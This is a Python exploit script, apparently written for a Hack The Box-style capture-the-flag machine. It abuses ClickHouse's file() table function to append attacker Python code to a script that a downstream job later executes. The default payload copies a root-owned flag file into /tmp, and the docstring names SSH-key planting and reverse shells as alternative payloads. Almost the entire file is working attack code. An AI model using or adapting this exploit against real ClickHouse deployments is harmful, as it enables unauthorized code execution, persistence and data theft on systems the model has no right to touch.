#!/usr/bin/env python3
"""Append bytes to a ClickHouse user_files path via GRANT FILE.

`INSERT INTO FUNCTION file('name','RawBLOB')` **appends**. The original
formatter stays intact; your Python runs after it on the next DLQ drain.

Default payload copies /root/root.txt → /tmp/rflag (mode 0644) and
writes /tmp/pwned. Pass --payload for an SSH-key plant or a reverse shell.

Usage:
  python3 ch_file_append.py -u default -p "$CH_DEFAULT_PASS" --verify
  python3 ch_file_append.py -u default -p "$CH_DEFAULT_PASS" --payload ./payload.py
"""
from __future__ import annotations

import argparse
import os
import sys

import ch_http

DEFAULT_NAME = "aidx_quarantine.py"
DEFAULT_PAYLOAD = r"""
# --- appended by ch_file_append.py ---
import os, shutil
try:
    shutil.copy("/root/root.txt", "/tmp/rflag")
    os.chmod("/tmp/rflag", 0o644)
    open("/tmp/pwned", "w").write("uid=0\n")
except Exception as e:
    open("/tmp/pwned", "w").write(repr(e) + "\n")
"""


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--url", default=os.environ.get("CH_URL", "http://db.htb-airport.htb/"))
    ap.add_argument("-u", "--user", default=os.environ.get("CH_DEFAULT_USER", "default"))
    ap.add_argument("-p", "--password", default=os.environ.get("CH_DEFAULT_PASS", ""))
    ap.add_argument("--name", default=DEFAULT_NAME, help="file under user_files/")
    ap.add_argument("--payload", help="Python file to append (default: copy root.txt)")
    ap.add_argument("--verify-only", action="store_true")
    ap.add_argument("--verify", action="store_true", help="print length + tail after INSERT")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if not args.password:
        print("[-] set --password or CH_DEFAULT_PASS", file=sys.stderr)
        return 2

    if args.verify_only:
        sql = f"SELECT * FROM file('{args.name}','RawBLOB')"
        code, body = ch_http.query(args.url, args.user, args.password, sql, 30)
        if code != 200:
            print(f"[-] HTTP {code}\n{body}", file=sys.stderr)
            return 1
        print(f"[*] {len(body)} bytes from file('{args.name}','RawBLOB')")
        print(body[-200:])
        return 0

    blob = open(args.payload, "rb").read() if args.payload else DEFAULT_PAYLOAD.encode()
    if not blob.startswith(b"\n"):
        blob = b"\n" + blob
    hx = blob.hex()
    sql = f"INSERT INTO FUNCTION file('{args.name}','RawBLOB') SELECT unhex('{hx}')"
    print(f"[*] append {len(blob)} bytes → user_files/{args.name}", file=sys.stderr)
    if args.dry_run:
        print(sql[:120] + f"...  ({len(sql)} chars)")
        return 0

    code, body = ch_http.query(args.url, args.user, args.password, sql, 30)
    if code != 200:
        print(f"[-] INSERT HTTP {code}\n{body}", file=sys.stderr)
        return 1
    print("[+] INSERT ok", file=sys.stderr)

    if args.verify:
        chk = f"SELECT * FROM file('{args.name}','RawBLOB')"
        code, body = ch_http.query(args.url, args.user, args.password, chk, 30)
        if code != 200:
            print(f"[-] verify HTTP {code}\n{body}", file=sys.stderr)
            return 1
        print(f"[*] now {len(body)} bytes, tail:")
        print(body[-200:])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
